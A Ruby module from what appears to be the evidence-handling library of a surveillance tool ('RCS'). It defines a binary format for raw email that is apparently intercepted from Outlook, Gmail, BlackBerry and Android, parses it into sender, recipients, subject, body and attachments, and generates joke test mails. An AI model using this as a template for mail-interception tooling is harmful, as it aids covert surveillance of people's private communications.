# encoding: UTF-8

require 'rcs-common/evidence/common'
require 'mail'

module RCS
module MailrawEvidence

  MAILRAW_VERSION = 2009070301
  MAILRAW_2_VERSION = 2012030601

  MAIL_INCOMING = 0x00000010

  PROGRAM_GMAIL = 0x00000000
  PROGRAM_BB = 0x00000001
  PROGRAM_ANDROID = 0x00000002

  ADDRESSES = ['ciccio.pasticcio@google.com', 'billg@microsoft.com', 'john.doe@nasa.gov', 'mario.rossi@italy.it']
  SUBJECTS = ['drugs', 'bust me!', 'police here']
  BODIES = ["You're busted, dude.", "I'm a drug trafficker, send me to hang!", "I'll sell meth to kids. Stop me."]
  
  def content
    binary = StringIO.new
    
    email = Mail.new do
      from    ADDRESSES.sample
      to      ADDRESSES.sample
      subject SUBJECTS.sample
      body    BODIES.sample
    end
    
    ft_high, ft_low = Time.now.to_filetime
    body = email.to_s
    add_header = [MAILRAW_VERSION, 1, body.bytesize, ft_high, ft_low].pack("I*")
    binary.write(add_header)
    binary.write(body)

    binary.string
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete MAILRAW") if data.nil? or data.bytesize == 0

    ret = Hash.new
    ret[:data] = Hash.new

    binary = StringIO.new data

    # flags indica se abbiamo tutto il body o solo header
    version, flags, size, ft_low, ft_high = binary.read(20).unpack('L*')
    
    case version
      when MAILRAW_VERSION
        ret[:data][:program] = 'outlook'
      when MAILRAW_2_VERSION
        program = binary.read(4).unpack('L*')
        case program
          when PROGRAM_GMAIL
            ret[:data][:program] = 'gmail'
          when PROGRAM_BB
            ret[:data][:program] = 'blackberry'
          when PROGRAM_ANDROID
            ret[:data][:program] = 'android'
          else
            ret[:data][:program] = 'unknown'
        end
        # direction of the mail
        ret[:data][:incoming] = (flags & MAIL_INCOMING != 0) ? 1 : 0
      else
        raise EvidenceDeserializeError.new("invalid log version for MAILRAW")
    end


    ret[:data][:size] = size
    return ret
  end

  def ct(parts)
    content_types = parts.map { |p| p.content_type.split(';')[0] }
    body = {}
    content_types.each_with_index do |ct, i|
      case ct
        when 'multipart/alternative'
          body = ct(parts[i].parts)
        else
          body ||= {}
          body[ct] = parts[i].body.decoded.safe_utf8_encode
      end
    end
    body
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:data][:type] = :mail

    eml = chunks.join
    info[:grid_content] = eml

    m = Mail.read_from_string eml
    info[:data][:from] = m.from.join(',').safe_utf8_encode unless m.from.nil?
    info[:data][:rcpt] = m.to.join(',').safe_utf8_encode unless m.to.nil?
    info[:data][:cc] = m.cc.join(',').safe_utf8_encode unless m.cc.nil?
    info[:data][:subject] = m.subject.safe_utf8_encode unless m.subject.nil?

    body = ct(m.parts) if m.multipart?
    # if not multipart, take body
    body ||= {}
    body['text/plain'] ||= m.body.decoded.safe_utf8_encode unless m.body.nil?

    if body.has_key? 'text/html'
      info[:data][:body] = body['text/html']
    else
      info[:data][:body] = body['text/plain']
      info[:data][:body] ||= ''
    end

    info[:data][:attach] = m.attachments.length if m.attachments.length > 0

    date = m.date.to_time unless m.date.nil?
    date ||= Time.now
    info[:data][:date] = date.getutc
    info[:da] = date.getutc

    info[:data][:date] = info[:data][:date].to_time if info[:data][:date].is_a? DateTime
    info[:da] = info[:da].to_time if info[:da].is_a? DateTime

    yield info if block_given?
    :delete_raw
  end
end # ::Mailraw
end # ::RCS